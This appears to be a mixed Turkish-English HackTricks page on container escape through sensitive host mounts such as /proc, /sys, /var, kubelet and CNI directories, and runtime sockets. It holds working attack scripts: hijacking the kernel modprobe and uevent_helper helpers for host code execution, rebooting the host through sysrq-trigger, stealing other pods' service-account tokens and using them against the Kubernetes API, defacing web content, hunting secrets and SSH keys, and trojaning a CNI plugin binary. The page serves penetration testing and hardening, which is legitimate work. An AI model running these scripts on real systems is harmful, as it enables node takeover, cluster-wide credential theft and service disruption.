# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Host mounts, en önemli pratik container-escape yüzeylerinden biridir; çünkü çoğu zaman dikkatle izole edilmiş bir process görünümünü doğrudan host kaynaklarının görünürlüğüne geri çevirir. Tehlikeli durumlar yalnızca `/` ile sınırlı değildir. `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state veya device ile ilgili path’lerin bind mount edilmesi; kernel kontrollerini, credentials'ları, komşu container filesystem'lerini ve runtime yönetim arayüzlerini açığa çıkarabilir.

Bu sayfa, bireysel protection sayfalarından ayrı olarak vardır; çünkü abuse modeli kesişimseldir. Yazılabilir bir host mount tehlikelidir; bunun bir kısmı mount namespaces, bir kısmı user namespaces, bir kısmı AppArmor veya SELinux kapsamı ve bir kısmı da tam olarak hangi host path'inin açığa çıkarıldığı ile ilgilidir. Bunu kendi başına bir konu olarak ele almak, attack surface'i çok daha kolay anlamayı sağlar.

## `/proc` Exposure

procfs, hem sıradan process bilgilerini hem de yüksek etkili kernel control arayüzlerini içerir. Bu nedenle `-v /proc:/host/proc` gibi bir bind mount veya beklenmedik writable proc girişlerini açığa çıkaran bir container görünümü, bilgi sızıntısına, denial of service'e veya doğrudan host code execution'a yol açabilir.

Yüksek değerli procfs path'leri şunları içerir:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Önce hangi yüksek değerli procfs girdilerinin görünür veya yazılabilir olduğunu kontrol ederek başlayın:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are güçlü reconnaissance kaynakları for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

The practical value of each path is different, and treating them all as if they had the same impact makes triage harder:

- `/proc/sys/kernel/core_pattern`
If writable, this is one of the highest-impact procfs paths because the kernel will execute a pipe handler after a crash. A container that can point `core_pattern` at a payload stored in its overlay or in a mounted host path can often obtain host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
This path controls the userspace helper used by the kernel when it needs to invoke module-loading logic. If writable from the container and interpreted in the host context, it can become another host code-execution primitive. It is especially interesting when combined with a way to trigger the helper path.
- `/proc/sys/vm/panic_on_oom`
This is not usually a clean escape primitive, but it can convert memory pressure into host-wide denial of service by turning OOM conditions into kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
If the registration interface is writable, the attacker may register a handler for a chosen magic value and obtain host-context execution when a matching file is executed.
- `/proc/config.gz`
Useful for kernel exploit triage. It helps determine which subsystems, mitigations, and optional kernel features are enabled without needing host package metadata.
- `/proc/sysrq-trigger`
Mostly a denial-of-service path, but a very serious one. It can reboot, panic, or otherwise disrupt the host immediately.
- `/proc/kmsg`
Reveals kernel ring buffer messages. Useful for host fingerprinting, crash analysis, and in some environments for leaking information helpful to kernel exploitation.
- `/proc/kallsyms`
Valuable when readable because it exposes exported kernel symbol information and may help defeat address randomization assumptions during kernel exploit development.
- `/proc/[pid]/mem`
This is a direct process-memory interface. If the target process is reachable with the necessary ptrace-style conditions, it may allow reading or modifying another process's memory. The realistic impact depends heavily on credentials, `hidepid`, Yama, and ptrace restrictions, so it is a powerful but conditional path.
- `/proc/kcore`
Exposes a core-image-style view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed host memory surface.
- `/proc/kmem` and `/proc/mem`
Historically high-impact raw memory interfaces. On many modern systems they are disabled or heavily restricted, but if present and usable they should be treated as critical findings.
- `/proc/sched_debug`
Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
- `/proc/[pid]/mountinfo`
Extremely useful for reconstructing where the container really lives on the host, which paths are overlay-backed, and whether a writable mount corresponds to host content or only to the container layer.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Bu komutlar faydalıdır çünkü birçok host-execution hilesi, container içindeki bir path’i host’un bakış açısından karşılık gelen path’e dönüştürmeyi gerektirir.

### Full Example: `modprobe` Helper Path Abuse

Eğer `/proc/sys/kernel/modprobe` container’dan yazılabilir durumdaysa ve helper path host bağlamında yorumlanıyorsa, saldırganın kontrol ettiği bir payload’a yönlendirilebilir:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Tam tetikleyici hedefe ve kernel davranışına bağlıdır, ancak önemli nokta şudur: yazılabilir bir helper path, gelecekteki bir kernel helper çağrısını saldırganın kontrolündeki host-path içeriğine yönlendirebilir.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Eğer amaç doğrudan escape yerine exploitability assessment ise:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Bu komutlar, yararlı symbol bilgilerin görünür olup olmadığını, son kernel mesajlarının ilginç durum ortaya çıkarıp çıkarmadığını ve hangi kernel özellikleri veya mitigations’ın derlenmiş olduğunu anlamaya yardımcı olur. Etkisi genellikle doğrudan escape değildir, ancak kernel-vulnerability triage süresini ciddi şekilde kısaltabilir.

### Full Example: SysRq Host Reboot

Eğer `/proc/sysrq-trigger` yazılabilir durumdaysa ve host görünümüne ulaşıyorsa:
```bash
echo b > /proc/sysrq-trigger
```
Etkisi anında host yeniden başlatmadır. Bu ince bir örnek değildir, ancak `procfs` exposure'un information disclosure'dan çok daha ciddi olabileceğini açıkça gösterir.

## `/sys` Exposure

`sysfs`, büyük miktarda kernel ve device state ortaya çıkarır. Bazı `sysfs` paths esas olarak fingerprinting için kullanışlıdır, diğerleri ise helper execution, device behavior, security-module configuration veya firmware state'i etkileyebilir.

Yüksek değerli `sysfs` paths şunları içerir:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Bu paths farklı nedenlerle önemlidir. `/sys/class/thermal`, thermal-management davranışını etkileyebilir ve bu nedenle kötü açığa çıkarılmış ortamlarda host stability'yi etkileyebilir. `/sys/kernel/vmcoreinfo`, low-level host fingerprinting'e yardımcı olan crash-dump ve kernel-layout information sızıntısı yapabilir. `/sys/kernel/security`, Linux Security Modules tarafından kullanılan `securityfs` interface'idir; bu nedenle buradaki beklenmeyen access, MAC ile ilgili state'i ifşa edebilir veya değiştirebilir. EFI variable paths, firmware-backed boot settings'i etkileyebilir; bu da onları sıradan configuration files'tan çok daha ciddi hale getirir. `/sys/kernel/debug` altındaki `debugfs` özellikle tehlikelidir çünkü kasıtlı olarak developer-oriented bir interface'tir ve hardened production-facing kernel APIs'e kıyasla çok daha az safety expectation'a sahiptir.

Bu paths için faydalı review commands şunlardır:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Bu komutları ilginç yapan şey:

- `/sys/kernel/security`, AppArmor, SELinux veya başka bir LSM surface’inin host-only kalması gerekirken görünür olup olmadığını ortaya çıkarabilir.
- `/sys/kernel/debug`, bu gruptaki en endişe verici bulgu olur. `debugfs` mount edilmiş ve okunabilir ya da yazılabilirse, etkinleştirilmiş debug node’larına bağlı olarak tam riski değişen geniş bir kernel-facing surface bekleyin.
- EFI variable exposure daha az yaygındır, ancak varsa etkisi büyüktür çünkü sıradan runtime dosyaları yerine firmware-backed ayarlara dokunur.
- `/sys/class/thermal` esas olarak host stabilitesi ve donanım etkileşimiyle ilgilidir, temiz bir shell-style escape ile değil.
- `/sys/kernel/vmcoreinfo` esas olarak host fingerprinting ve crash-analysis kaynağıdır, düşük seviyeli kernel durumunu anlamak için faydalıdır.

### Full Example: `uevent_helper`

Eğer `/sys/kernel/uevent_helper` yazılabilir ise, kernel bir `uevent` tetiklendiğinde saldırgan tarafından kontrol edilen bir helper çalıştırabilir:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Bunun çalışmasının nedeni, yardımcı yolunun host'un bakış açısından yorumlanmasıdır. Tetiklendiğinde, helper mevcut container içinde değil, host context'inde çalışır.

## `/var` Exposure

Host'un `/var` dizinini bir container'a mount etmek, `/` mount etmek kadar dramatik görünmediği için çoğu zaman hafife alınır. Pratikte, runtime socket'lerine, container snapshot dizinlerine, kubelet-managed pod volume'larına, projected service-account token'larına ve komşu application filesystem'lerine ulaşmak için yeterli olabilir. Modern node'larda `/var`, çoğu zaman operasyonel olarak en ilgi çekici container state'inin gerçekten bulunduğu yerdir.

### Kubernetes Example

`hostPath: /var` olan bir pod, çoğu zaman diğer pod'ların projected token'larını ve overlay snapshot içeriğini okuyabilir:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Bu komutlar yararlıdır çünkü mount’un yalnızca sıradan uygulama verilerini mi yoksa yüksek etkili cluster credentials mı açığa çıkardığını söyler. Okunabilir bir service-account token, local code execution’ı hemen Kubernetes API access’e dönüştürebilir.

Token mevcutsa, token keşfinde durmak yerine neye erişebildiğini doğrulayın:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Buradaki etki, local node access'ten çok daha büyük olabilir. Geniş RBAC'e sahip bir token, mount edilmiş bir `/var`'ı cluster-wide compromise'a çevirebilir.

### Docker And containerd Example

Docker host'larında ilgili veriler çoğu zaman `/var/lib/docker` altındadır, containerd-backed Kubernetes node'larında ise `/var/lib/containerd` ya da snapshotter-specific paths altında olabilir:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Eğer mount edilen `/var`, başka bir workload’un yazılabilir snapshot içeriğini açığa çıkarıyorsa, saldırgan application dosyalarını değiştirebilir, web content yerleştirebilir veya current container configuration’a dokunmadan startup scripts’i değiştirebilir.

Yazılabilir snapshot content bulunduğunda uygulanabilecek somut abuse fikirleri:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Bu komutlar faydalıdır çünkü mount edilmiş `/var` için üç ana etki ailesini gösterirler: application tampering, secret recovery ve komşu workloads içine lateral movement.

## Kubelet State, Plugins, And CNI Paths

`/var/lib/kubelet`, `/opt/cni/bin` veya `/etc/cni/net.d` mount’u çoğu zaman privileged DaemonSets, CNI agents, CSI node plugins, GPU operators ve storage helpers üzerinden açığa çıkar. Bu mount’lar kolayca "node plumbing" olarak göz ardı edilir, ancak yeni pods için execution path üzerinde doğrudan yer alırlar ve çoğu zaman kubelet credentials, projected secrets, registration sockets ve executable host-side plugin binaries içerirler.

High-value targets şunlardır:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful review commands are:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Bu yolların neden önemli olduğu:

- `/var/lib/kubelet/pki`, kubelet client certificates ve diğer node-local credentials’ları açığa çıkarabilir; bunlar cluster tasarımına bağlı olarak bazen API server veya kubelet-facing TLS endpoints’e karşı yeniden kullanılabilir.
- `/var/lib/kubelet/pods` çoğu zaman aynı node üzerindeki komşu pods için projected service-account tokens ve mounted Secrets içerir.
- `/var/lib/kubelet/pod-resources/kubelet.sock` esasen bir reconnaissance yüzeyidir, ama çok kullanışlıdır: hangi pods ve containers’ın şu anda GPUs, hugepages, SR-IOV devices ve diğer kıt node-local resources üzerinde hak sahibi olduğunu gösterir.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` ve `/var/lib/kubelet/plugins_registry`, hangi CSI, DRA ve device plugins’in kurulu olduğunu ve kubelet’in hangi sockets ile konuşmasının beklendiğini gösterir. Bu dizinler yalnızca readable değil de writable ise, bulgu çok daha ciddi hale gelir.
- `/opt/cni/bin` ve `/etc/cni/net.d` doğrudan pod-network kurulum yolunun üzerindedir. Burada writable access çoğu zaman sadece configuration exposure değil, gecikmeli bir host-execution primitive anlamına gelir.

### Full Example: Writable `/opt/cni/bin`

Eğer bir host CNI binary directory read-write olarak mount edildiyse, bir plugin’i değiştirmek, kubelet o node üzerinde bir sonraki kez bir pod sandbox oluşturduğunda host execution elde etmek için yeterli olabilir:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Bu, mount edilmiş bir `docker.sock` kadar acil değildir, ancak çoğu zaman ele geçirilmiş Kubernetes infrastructure pod'larında daha gerçekçidir. Önemli nokta, değiştirilmiş binary'nin daha sonra current container tarafından değil, host network setup flow tarafından çalıştırılmasıdır.


## Runtime Sockets

Sensitive host mounts çoğu zaman tam dizinler yerine runtime sockets içerir. Bunlar o kadar önemlidir ki burada açıkça tekrar edilmeyi hak ederler:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Tam bu socket'lerden biri mount edildikten sonra tam exploitation akışları için [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) bölümüne bakın.

Hızlı bir ilk etkileşim paterni olarak:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Eğer bunlardan biri başarılı olursa, "mounted socket"tan "daha ayrıcalıklı bir sibling container başlatma"ya giden yol genelde herhangi bir kernel breakout yolundan çok daha kısadır.

## Mount-Related CVEs

Host mounts ayrıca runtime vulnerabilities ile kesişir. Önemli son örnekler şunları içerir:

- `CVE-2024-21626` in `runc`, where a leaked directory file descriptor could place the working directory on the host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652`, and `CVE-2024-23653` in BuildKit, where malicious Dockerfiles, frontends, and `RUN --mount` flows could reintroduce host file access, deletion, or elevated privileges during builds.
- `CVE-2024-1753` in Buildah and Podman build flows, where crafted bind mounts during build could expose `/` read-write.
- `CVE-2025-47290` in `containerd` 2.1.0, where a TOCTOU during image unpack could let a specially crafted image modify the host filesystem during pull.

Bu CVE'ler burada önemlidir çünkü mount handling'in sadece operator configuration ile ilgili olmadığını gösterirler. Runtime'ın kendisi de mount-driven escape conditions ekleyebilir.

## Checks

Bu komutları kullanarak en yüksek değerli mount exposures'ları hızlıca bulun:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Burada ilginç olan:

- Host root, `/proc`, `/sys`, `/var` ve runtime sockets hepsi yüksek öncelikli bulgulardır.
- Yazılabilir proc/sys girdileri çoğu zaman mount’un güvenli bir container görünümü yerine host-genel kernel kontrollerini açığa çıkardığı anlamına gelir.
- Mount edilmiş `/var` yolları, yalnızca filesystem incelemesi değil, credential ve komşu workload incelemesi de gerektirir.
- Kubelet state directories ve CNI/plugin yolları, runtime sockets ile aynı önceliğe sahiptir çünkü çoğu zaman doğrudan node’un pod oluşturma ve credential dağıtım yolunun üzerinde yer alırlar.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
